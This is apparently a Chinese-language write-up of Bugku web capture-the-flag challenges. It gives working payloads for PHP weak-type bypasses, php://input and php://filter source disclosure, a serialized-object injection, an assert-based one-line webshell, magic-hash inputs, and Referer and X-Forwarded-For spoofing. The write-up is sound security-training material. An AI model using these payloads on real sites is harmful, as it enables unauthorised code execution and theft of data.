+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135645667.png" alt="image-20200527135645667"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--&quot;;</span><br><span class="line"># 判断id是否为空和0</span><br><span class="line">if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line"># 如果id为空，则我们看到URL加上hello.php?id&#x3D;1</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line"># 退出</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line"># 判断a变量中.第一次出现的位置，只有当a没有.的时候才能不执行if里面的语句</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 读取变量a</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line"></span><br><span class="line"># 进行判断，当data等于bugku is a nice plateform!，当id等于0，当b&gt;5，当111等于1114，b的第一个字符不等于4</span><br><span class="line"></span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">--&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>限制 URL 查询字符串中必须有非空非零变量 <code>id</code></li>
+<li>限制变量 <code>$a</code> 中不能含有字符 <code>.</code></li>
+<li>要满足以下 5 条表达式才会爆 flag： <ul>
+<li>变量 <code>$data</code> 弱等于字符串 <code>bugku is a nice plateform!</code></li>
+<li>变量 <code>$id</code> 弱等于整型数 0</li>
+<li>变量 <code>$b</code> 的长度大于 5</li>
+<li>字符串 <code>1114</code> 要与字符串 <code>111</code> 连接变量 <code>$b</code> 的第一个字符构成的正则表达式匹配</li>
+<li>变量 <code>$b</code> 的第一个字符弱不等于整型数 4</li>
+</ul>
+</li>
+</ul>
+<p>可以看到，代码中已经爆出来了flag文件，所以可以直接访问flag文件。</p>
+<p>也可以构造Payload：<code>?id=.&amp;a=php://input&amp;b=.123456</code>,post:<code>data=bugku is a nice plateform!</code></p>
+<h5 id="首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE"><a href="#首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE" class="headerlink" title="首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE"></a>首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527114619744.png" alt="image-20200527114619744"></p>
+<p>先直接访问flag文件，直接复制粘贴</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527140149790.png" alt="image-20200527140149790"></p>
+<p>构造的网址，返回了flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527140359102.png" alt="image-20200527140359102"></p>
+<h4 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180103558.png" alt="image-20200607180103558"></p>
+<p>查看原始界面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180123318.png" alt="image-20200607180123318"></p>
+<p>F12查看一下源码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180139956.png" alt="image-20200607180139956"></p>
+<p>很显然想让我们利用源码去得到flag。这里我们稍微解释下这个源码的意思。</p>
+<p>开始有三个变量：user，file，pass，但是我们发现这里的pass也就是password没有什么用，因为代码里面虽然定义了这个变量但是并没有使用到。所以我们重点关注前两个变量。看下面的条件</p>
+<p>（1）<code>if(isset($user))</code>这个isset()函数是判断$user这个变量的是否存在，user变量不能为空</p>
+<p>（2）<code>(file_ get_ contents ($user,&#39; r&#39; )===&quot; welcome to the bugkuctf&quot;))</code></p>
+<p>file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to the bugkuctf”完全相等（类型，内容）。</p>
+<p>（3）<code>include($file); // hint.php</code>所以我们要在满足条件之后读取file=hint.php。</p>
+<p>知道了以上的三个条件后我们就可以做第一步了，就是如何满足他们的条件！？</p>
+<p>这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到   “php://input”协议。大致的意思是让　txt=php://input ，之后在post过去一个字符串.</p>
+<h5 id="php伪协议介绍"><a href="#php伪协议介绍" class="headerlink" title="php伪协议介绍"></a>php伪协议介绍</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input</span><br><span class="line">构造场景：本地web服务器根目录下有文件phpinput_server.php，</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">     $a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">     $raw_post_data &#x3D; file_get_contents($a,&#39;r&#39;);&#x2F;&#x2F;&#39;php:&#x2F;&#x2F;input&#39;</span><br><span class="line">     echo $raw_post_data;</span><br><span class="line"> </span><br><span class="line"> ?&gt;</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">在浏览器中按照如下方式访问：</span><br><span class="line">post框直接输入一段数据</span><br><span class="line">excute后，脚本会在页面中输出这段数据。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607182627993.png" alt="image-20200607182627993"></p>
+<p>此种方式可以用来获取post数据，但不能获取get数据。</p>
+<p>具体介绍查看：<a href="https://www.cnblogs.com/yinqin/articles/4088589.html" target="_blank" rel="noopener">https://www.cnblogs.com/yinqin/articles/4088589.html</a></p>
+<p>当传进去的参数作为文件名变量去打开文件时，可以将参数php://传进，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607182947553.png" alt="image-20200607182947553"></p>
+<p>简单来说就是将指定字符串作为文件传给txt，然后再将user的内容读出来。此时我们就满足了</p>
+<p>这样就满足了<code>(file_ get_ contents ($user,&#39; r&#39; )===&quot; welcome to the bugkuctf&quot;))</code>然后我们得到了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607183250757.png" alt="image-20200607183250757"></p>
+<p>此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter</p>
+<p>即<code>txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code>（简单来说就是利用伪协议读取所包含文件的base64值）</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607183441201.png" alt="image-20200607183441201"></p>
+<p>复制base64加密的内容进行解码，得到以下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#hint.php  </span><br><span class="line">  </span><br><span class="line">&lt;?php    </span><br><span class="line">    </span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    public function __tostring()&#123;    </span><br><span class="line">        if(isset($this-&gt;file))&#123;    </span><br><span class="line">            echo file_get_contents($this-&gt;file);   </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">        return (&quot;good&quot;);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后可以继续利用伪协议读取一下index.php源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#index.php  </span><br><span class="line">&lt;?php    </span><br><span class="line">$txt &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line">    </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;    </span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;   </span><br><span class="line">        echo &quot;不能现在就给你flag哦&quot;;  </span><br><span class="line">        exit();    </span><br><span class="line">    &#125;else&#123;    </span><br><span class="line">        include($file);     </span><br><span class="line">        $password &#x3D; unserialize($password);    </span><br><span class="line">        echo $password;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line">?&gt;    </span><br><span class="line">    </span><br><span class="line">&lt;!--    </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line">    </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;    </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not admin ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（1）在hint.php中我们看到了<code>class Flag{//flag.php</code>  ，所以我们把index.php改成flag.php看看会有什么结果，发现</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607184045001.png" alt="image-20200607184045001"></p>
+<p>居然返回了乱码，看到之前的源码可以知道这是<code>index.php</code>中的<code>echo &quot;不能现在就给你flag哦&quot;;</code>所以不能直接<code>flag.php</code>。</p>
+<p>在index我们看到，这个意思是file中如果包含‘flag’，那么就会给你退出。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607184245372.png" alt="image-20200607184245372"></p>
+<p>所以我们要想其他办法读flag.php</p>
+<p>我们往下看可以看到</p>
+<p>这个else写到如果我的file不包含‘flag’，那么我就会把那个文件包含进来，之后将password反序列化一下。并输出password的结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else&#123;    </span><br><span class="line">        include($file);     </span><br><span class="line">        $password &#x3D; unserialize($password);    </span><br><span class="line">        echo $password;    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>而我们根据上面的hint.php发现，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#hint.php  </span><br><span class="line">  </span><br><span class="line">&lt;?php    </span><br><span class="line">    </span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    public function __tostring()&#123;    </span><br><span class="line">        if(isset($this-&gt;file))&#123;    </span><br><span class="line">            echo file_get_contents($this-&gt;file);   </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">        return (&quot;good&quot;);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。</p>
+<p>这不正是我们要解决的输出flag.php内容的情况吗？？？</p>
+<p>所以我们要构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（因为要利用hint.php中的函数），即：——根据php序列化的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    class Flag&#123;</span><br><span class="line">    public $file;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    $a &#x3D; new Flag();  </span><br><span class="line">    $a-&gt;file &#x3D; &quot;flag.php&quot;;  </span><br><span class="line">    $a &#x3D; serialize($a);  </span><br><span class="line">    print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 得到：　　O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}  传入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607190756684.png" alt="image-20200607190756684"></p>
+<p>得到</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607190814885.png" alt="image-20200607190814885"></p>
+<h4 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607174619683.png" alt="image-20200607174619683"></p>
+<p>查看原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607174643967.png" alt="image-20200607174643967"></p>
+<p>可以看到题目中给的提示</p>
+<p>使用explode函数将poc变量里的#进行截断，然后将分离出来的值放到数组中，得到assert</p>
+<p><code>exlpde()分割a#s#s#e#r#t 为 assert</code></p>
+<p>用assert函数来解析传进来的字符，assert有代码执行漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc&#x3D;&quot;a#s#s#e#r#t&quot;;</span><br><span class="line">$poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造Payload：<code>http://123.206.87.240:8010/?s=print_r(scandir(&#39;./&#39;))</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607175205721.png" alt="image-20200607175205721"></p>
+<p>可以看到里面有f94lag.txt文件，在url中添加改文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607175305991.png" alt="image-20200607175305991"></p>
+<h4 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h4><p>打开页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527155731657.png" alt="image-20200527155731657"></p>
+<p>查看源页面，可以看到有正则匹配然后构造Payload:<code>keykeykeykeykeykeykeykeykeykey:///keykeykeyx&quot;i</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527155822458.png" alt="image-20200527155822458"></p>
+<p>成功返回KEY值</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527160225084.png" alt="image-20200527160225084"></p>
+<h4 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192732367.png" alt="image-20200607192732367"></p>
+<p>查看原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192825276.png" alt="image-20200607192825276"></p>
+<p>点击<strong>链接</strong>这两个字。</p>
+<p>发现一段代码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607193505347.png" alt="image-20200607193505347"></p>
+<p>里面有MD5，MD5是不能处理数组的，所以构造Payload：<code>v1[]=1&amp;v2[]=2&amp;v3[]=3</code>，然后返回flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607193720093.png" alt="image-20200607193720093"></p>
+<h4 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h4><p>打开网址，可以看到题目提示SQL注入约束攻击</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527160418382.png" alt="image-20200527160418382"></p>
+<p>SQL约束攻击：在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。</p>
+<p>我们尝试了暴力破解等，发现并不能破解出来，我们知道像这种管理后台用户名是admin毋庸置疑，所以利用SQL约束攻击的特性进行攻击，注册用户</p>
+<p>更改了Type让其显示输入的密码，点击注册</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527172806930.png" alt="image-20200527172806930"></p>
+<p>返回了注册成功，等两秒就会返回登录界面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527172857635.png" alt="image-20200527172857635"></p>
+<p>在登录界面输入刚才注册的用户名和密码，成功返回。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527173023123.png" alt="image-20200527173023123"></p>
+<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174500035.png" alt="image-20200527174500035"></p>
+<p>返回了 Are you from google？(你是谷歌的吗？)</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174604248.png" alt="image-20200527174604248"></p>
+<p>到这就可以看出，上面是需要我们伪造一下链接Referer</p>
+<p>Payload：<code>https://www.google.com</code></p>
+<p>你是无法在页面中更改的，所以使用burp抓包，然后发送的Repeater中进行更改运行。</p>
+<p>成功返回flag，复制提交就ok</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174851825.png" alt="image-20200527174851825"></p>
+<h4 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180144324.png" alt="image-20200527180144324"></p>
+<p>原始页面，让其输入a，我们输入?a=1查看返会结果</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180242821.png" alt="image-20200527180242821"></p>
+<p>返回false说明错误。这里已经已经看过了burp抓包和F12了，什么都没有。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180318161.png" alt="image-20200527180318161"></p>
+<p>当我看看题目的时候发现题目是MD5碰撞，我们百度一下什么是MD5碰撞</p>
+<p>解释是：</p>
+<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+<p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
+<p>原文链接：<a href="https://blog.csdn.net/qq_30464257/article/details/81432446" target="_blank" rel="noopener">https://blog.csdn.net/qq_30464257/article/details/81432446</a></p>
+<p>其中常见的MD5碰撞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">0e开头的md5和原值：</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>
+
+<p>以上的MD5碰撞哪一个都行，所以我们只要随便复制一个就可以。复制提交就可以。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180825418.png" alt="image-20200527180825418"></p>
+<h4 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081646555.png" alt="image-20200528081646555"></p>
+<p>显示原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081720351.png" alt="image-20200528081720351"></p>
+<p>显示从本地访问，这样肯明显就需伪造一下IP，当然想要我在IP的话就需要用burp进行抓包修改运行</p>
+<p>将抓取的数据包发送到Repeter模块，在其中加入X-Forwarded-for:127.0.0.1</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081836626.png" alt="image-20200528081836626"></p>
+<p>这样就成功显示flag了，直接复制提交就OK</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528082002023.png" alt="image-20200528082002023"></p>
+<h4 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084108275.png" alt="image-20200528084108275"></p>
+<p>查看原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084159215.png" alt="image-20200528084159215"></p>
+<p>从以上代码分析，可以看到几条有用的信息</p>
+<p>1、使 uname的sha1值 与 passwd的sha1的值 相等</p>
+<p>2、但是同时 uname 和 passwd两个的值又不能相等</p>
+<p>3、id == “margin”</p>
+<p>解决办法</p>
+<p>1、GTE输入的有uname和id，POST输出的是passwd</p>
+<p>2、把 uname 和 passwd定义成数组，数组的哈希值相同</p>
+<p>3、id等于margin</p>
+<p>在页面中输入，复制提交即可</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084608223.png" alt="image-20200528084608223"></p>
+<h4 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h4><p>打开网址</p>
